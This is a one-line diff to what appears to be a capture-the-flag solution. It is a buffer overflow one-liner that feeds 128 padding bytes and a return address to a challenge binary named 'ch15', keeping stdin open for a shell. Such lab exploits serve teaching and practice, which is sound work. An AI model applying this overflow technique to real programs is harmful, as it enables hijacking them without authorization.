@@ -1,1 +1,1 @@
-(python -c 'print A*128+x16x85x04x08'; cat) | ./ch15
+(python -c 'print A*128+\x16\x85\x04\x08'; cat) | ./ch15
